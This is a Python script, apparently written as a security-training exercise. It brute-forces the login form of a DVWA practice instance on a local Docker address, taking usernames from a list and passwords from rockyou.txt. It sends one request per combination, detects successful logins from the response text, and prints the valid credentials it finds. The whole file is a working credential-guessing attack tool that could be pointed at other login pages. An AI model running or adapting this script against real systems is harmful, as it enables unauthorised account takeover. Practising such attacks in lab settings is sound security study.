import requests
import sys

url = "http://172.17.0.2/vulnerabilities/brute/"

headers = {
    "Cookie": "security=low; PHPSESSID=nu7bvpdtsjtjd4hu9mlacj12f5",  
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

def brute_force_attack(username_file, password_file):
    count_fails = 0     
    credentials = []

    with open(username_file, 'r') as users:
        user_list = [user.strip() for user in users]
        
    with open(password_file, 'r') as passwords:
        password_list = [password.strip() for password in passwords]

    sys.stdout.write("Probando...\n")
    sys.stdout.flush()

    for user in user_list:
        for password in password_list:
            params = {
                "username": user,
                "password": password,
                "Login": "Login"
            }
            
            response = requests.get(url, headers=headers, params=params)
            
            response_text = response.text.replace("\n", "").replace("\r", "").strip()
            
            if "Username and/or password incorrect." in response_text:
                count_fails += 1
            elif f"Welcome to the password protected area {user}" in response_text:
                print(f"✓ Combinación válida para {user} encontrada")
                credentials.append({"user": user, "password": password})
                
                if len(credentials) == 5:
                    print("\nCredenciales encontradas:")
                    for i, cred in enumerate(credentials):
                        print(f"{i+1}.\033[96m Usuario:\033[93m {cred['user']}, \033[96mContraseña: \033[93m{cred['password']}\033[0m")
                    print("\nTotal de fallos: ", count_fails)
                    return
                else:
                    break    
            else:
                continue


username_file = "../utils/users.txt"
password_file = "../utils/rockyou.txt"

brute_force_attack(username_file, password_file)
